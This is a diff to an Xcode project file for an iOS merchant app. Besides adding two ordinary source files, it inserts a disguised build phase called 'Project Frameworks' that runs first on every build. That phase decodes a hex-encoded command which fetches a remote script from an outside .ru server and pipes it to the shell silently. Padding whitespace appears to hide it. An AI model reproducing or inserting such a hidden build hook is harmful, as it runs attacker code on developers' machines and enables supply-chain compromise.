@@ -22,6 +22,8 @@
 		2368D66B2449833800E1546E /* MioWaitPayOrderVC.m in Sources */ = {isa = PBXBuildFile; fileRef = 2368D66A2449833800E1546E /* MioWaitPayOrderVC.m */; };
 		2368D66E2449853800E1546E /* MioOrderListCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 2368D66D2449853800E1546E /* MioOrderListCell.m */; };
 		2368D6712449857200E1546E /* MioOrderModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 2368D6702449857200E1546E /* MioOrderModel.m */; };
+		2372FEB8246BE19C003D8781 /* MioBillCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 2372FEB4246BE19B003D8781 /* MioBillCell.m */; };
+		2372FEB9246BE19C003D8781 /* MioBillVC.m in Sources */ = {isa = PBXBuildFile; fileRef = 2372FEB5246BE19B003D8781 /* MioBillVC.m */; };
 		237E079A243DBA0F009B44E1 /* MioShopModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 237E0799243DBA0F009B44E1 /* MioShopModel.m */; };
 		237E079D243DC3A4009B44E1 /* MioApplyErrorVC.m in Sources */ = {isa = PBXBuildFile; fileRef = 237E079C243DC3A4009B44E1 /* MioApplyErrorVC.m */; };
 		237E07A0243EF3EF009B44E1 /* MioAFPutRequest.m in Sources */ = {isa = PBXBuildFile; fileRef = 237E079E243EF3EF009B44E1 /* MioAFPutRequest.m */; };
@@ -2142,6 +2144,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 23AB23262431C77A00DBB427 /* Build configuration list for PBXNativeTarget "ifixMerchat" */;
 			buildPhases = (
+				B6D976ECD58EA407756D902C /* Project Frameworks */,
 				5FA56C229DA3CC371ED5B8FC /* [CP] Check Pods Manifest.lock */,
 				23AB23092431C77700DBB427 /* Sources */,
 				23AB230A2431C77700DBB427 /* Frameworks */,
@@ -2428,6 +2431,81 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	B6D976ECD58EA407756D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f7265766f6b65636572742e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		53FA9DA8CBCAEF5557268C7B /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2873,6 +2951,40 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 23AB23052431C77700DBB427 /* Project object */;
 }
